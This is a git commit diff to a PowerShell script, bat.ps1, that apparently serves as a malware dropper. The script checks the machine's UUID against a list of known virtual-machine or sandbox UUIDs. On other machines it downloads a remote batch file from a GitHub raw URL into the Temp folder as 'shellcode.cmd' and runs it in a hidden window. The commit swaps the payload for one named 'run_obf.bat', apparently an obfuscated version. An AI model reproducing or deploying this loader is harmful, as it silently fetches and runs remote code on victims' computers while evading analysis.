08f610d2a6bae9a087fe018d4e5f92ed0a932858
43a1723 <hai1723notgay@gmail.com>
2024-06-28 13:44:23 +0700

    Update bat.ps1

--- bat.ps1
+++ bat.ps1
@@ -93,7 +93,7 @@ $invalidUUIDs = @("03D40274-0435-05DC-8506-010700080009", "03000200-0400-0500-00
 
 # Kiểm tra nếu UUID không nằm trong danh sách UUID không hợp lệ
 if ($invalidUUIDs -notcontains $UUID) {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/skidtoi.bat" -OutFile "$env:Temp\shellcode.cmd"
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/run_obf.bat" -OutFile "$env:Temp\shellcode.cmd"
     Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
 }
 
